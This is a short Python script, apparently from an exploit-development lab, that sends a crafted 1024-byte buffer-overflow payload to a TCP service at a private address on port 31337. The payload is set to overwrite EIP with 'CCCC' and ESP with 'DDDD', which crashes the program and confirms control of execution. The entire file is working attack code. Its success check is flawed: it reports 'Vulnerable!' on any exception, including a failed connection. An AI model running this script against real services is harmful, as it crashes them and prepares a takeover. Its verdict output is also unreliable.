#!/usr/bin/env python3

import socket

# Target Information

RHOST = "192.168.226.165"   # IP of target Remote Host
RPORT = 31337   # Listening Port

buf_total = 1024
offset_rp = 146

# Build Response

buf = b""
buf += b"A"*(offset_rp-len(buf))    # send payload to crash program
buf += b"CCCC" # EIP should point here
buf += b"DDDD" # ESP should point here
buf += b"B"*(buf_total-len(buf))
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create IPV4 socket, TCP type
    s.connect((RHOST,RPORT)) # connect to remote host on   port
    s.send(buf + b"\n")
    s.recv(1024)

except:
    print(f"Vulnerable! Crash at around: {len(buf)}")
    exit